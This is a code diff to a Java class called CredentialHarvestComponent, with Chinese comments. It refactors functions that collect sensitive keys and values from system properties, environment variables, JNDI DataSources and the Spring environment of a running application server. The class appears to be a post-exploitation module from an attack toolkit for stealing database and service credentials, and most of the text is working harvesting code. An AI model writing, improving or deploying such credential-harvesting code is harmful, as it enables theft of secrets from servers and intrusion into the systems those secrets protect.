@@ -115,11 +115,11 @@ public class CredentialHarvestComponent implements Runnable {
         try {
             Object result = null;
             switch (opType) {
-                case 1: result = harvestDataSources(); break;
-                case 2: result = harvestSystemProperties(); break;
-                case 3: result = harvestEnvVars(); break;
-                case 4: result = harvestJndi(); break;
-                case 5: result = harvestSpringEnv(); break;
+                case OP_HARVEST_DATASOURCE: result = harvestDataSources(); break;
+                case OP_HARVEST_SYSTEM_PROPS: result = harvestSystemProperties(); break;
+                case OP_HARVEST_ENV: result = harvestEnvVars(); break;
+                case OP_HARVEST_JNDI: result = harvestJndi(); break;
+                case OP_HARVEST_SPRING_ENV: result = harvestSpringEnv(); break;
             }
             if (result != null) {
                 allResults.put(key, result);
@@ -265,13 +265,14 @@ public class CredentialHarvestComponent implements Runnable {
     private ArrayList harvestSystemProperties() {
         ArrayList result = new ArrayList();
         String customFilter = getStringParam("filter");
+        if (customFilter != null) customFilter = customFilter.toLowerCase();
         Properties props = System.getProperties();
         Iterator it = props.entrySet().iterator();
         while (it.hasNext()) {
             Map.Entry entry = (Map.Entry) it.next();
             String key = String.valueOf(entry.getKey());
             String value = String.valueOf(entry.getValue());
-            if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
+            if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter))) {
                 HashMap item = new HashMap();
                 item.put("key", key);
                 item.put("value", value);
@@ -286,13 +287,14 @@ public class CredentialHarvestComponent implements Runnable {
     private ArrayList harvestEnvVars() {
         ArrayList result = new ArrayList();
         String customFilter = getStringParam("filter");
+        if (customFilter != null) customFilter = customFilter.toLowerCase();
         Map env = System.getenv();
         Iterator it = env.entrySet().iterator();
         while (it.hasNext()) {
             Map.Entry entry = (Map.Entry) it.next();
             String key = String.valueOf(entry.getKey());
             String value = String.valueOf(entry.getValue());
-            if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
+            if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter))) {
                 HashMap item = new HashMap();
                 item.put("key", key);
                 item.put("value", value);
@@ -313,41 +315,42 @@ public class CredentialHarvestComponent implements Runnable {
                 "jdbc"
         };
 
-        for (int i = 0; i < jndiPaths.length; i++) {
-            try {
-                Object initCtx = newInitialContext();
-                if (initCtx == null) break;
+        Object initCtx = newInitialContext();
+        if (initCtx == null) return result;
+        try {
+            for (int i = 0; i < jndiPaths.length; i++) {
+                try {
+                    Object namingEnum = invokeMethod(initCtx, "list",
+                            new Class[]{String.class}, new Object[]{jndiPaths[i]});
 
-                Object namingEnum = invokeMethod(initCtx, "list",
-                        new Class[]{String.class}, new Object[]{jndiPaths[i]});
+                    if (namingEnum != null) {
+                        while (((Boolean) invokeMethod(namingEnum, "hasMore")).booleanValue()) {
+                            Object binding = invokeMethod(namingEnum, "next");
+                            String name = (String) invokeMethod(binding, "getName");
+                            String fullPath = jndiPaths[i] + "/" + name;
 
-                if (namingEnum != null) {
-                    while (((Boolean) invokeMethod(namingEnum, "hasMore")).booleanValue()) {
-                        Object binding = invokeMethod(namingEnum, "next");
-                        String name = (String) invokeMethod(binding, "getName");
-                        String fullPath = jndiPaths[i] + "/" + name;
+                            try {
+                                Object looked = invokeMethod(initCtx, "lookup",
+                                        new Class[]{String.class}, new Object[]{fullPath});
 
-                        try {
-                            Object looked = invokeMethod(initCtx, "lookup",
-                                    new Class[]{String.class}, new Object[]{fullPath});
-
-                            HashMap entry = new HashMap();
-                            entry.put("jndiPath", fullPath);
-                            entry.put("className", looked.getClass().getName());
-
-                            // 尝试提取 DataSource 连接信息
-                            HashMap dsInfo = extractDataSourceInfo(fullPath, looked);
-                            if (dsInfo != null) {
-                                entry.put("connectionInfo", dsInfo);
+                                HashMap entry = new HashMap();
+                                entry.put("jndiPath", fullPath);
+                                entry.put("className", looked.getClass().getName());
+                                HashMap dsInfo = extractDataSourceInfo(fullPath, looked);
+                                if (dsInfo != null) entry.put("connectionInfo", dsInfo);
+                                result.add(entry);
+                            } catch (Exception ignored) {
                             }
-                            result.add(entry);
-                        } catch (Exception ignored) {
                         }
                     }
+                } catch (Exception ignored) {
+                    // JNDI 路径不存在或无权限，继续尝试下一个路径。
                 }
+            }
+        } finally {
+            try {
                 invokeMethod(initCtx, "close");
             } catch (Exception ignored) {
-                // JNDI 路径不存在或无权限，跳过
             }
         }
         return result;
@@ -386,6 +389,7 @@ public class CredentialHarvestComponent implements Runnable {
         }
 
         String customFilter = getStringParam("filter");
+        if (customFilter != null) customFilter = customFilter.toLowerCase();
 
         while (it.hasNext()) {
             Object propertySource = it.next();
@@ -398,7 +402,7 @@ public class CredentialHarvestComponent implements Runnable {
                     while (entryIt.hasNext()) {
                         Map.Entry entry = (Map.Entry) entryIt.next();
                         String key = String.valueOf(entry.getKey());
-                        if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
+                        if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter))) {
                             // 通过 environment.getProperty() 获取解析后的值（支持占位符解析）
                             String resolvedValue = null;
                             try {
@@ -420,30 +424,6 @@ public class CredentialHarvestComponent implements Runnable {
                     }
                 }
 
-                // 处理 Properties 类型的 source（如 systemProperties）
-                if (source instanceof Properties) {
-                    Iterator propIt = ((Properties) source).entrySet().iterator();
-                    while (propIt.hasNext()) {
-                        Map.Entry entry = (Map.Entry) propIt.next();
-                        String key = String.valueOf(entry.getKey());
-                        if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
-                            String resolvedValue = null;
-                            try {
-                                resolvedValue = (String) invokeMethod(environment, "getProperty",
-                                        new Class[]{String.class}, new Object[]{key});
-                            } catch (Exception ignored) {
-                                resolvedValue = String.valueOf(entry.getValue());
-                            }
-                            if (resolvedValue != null) {
-                                HashMap item = new HashMap();
-                                item.put("key", key);
-                                item.put("value", resolvedValue);
-                                item.put("source", sourceName);
-                                result.add(item);
-                            }
-                        }
-                    }
-                }
             } catch (Exception ignored) {
                 // 某个 PropertySource 解析失败，跳过
             }
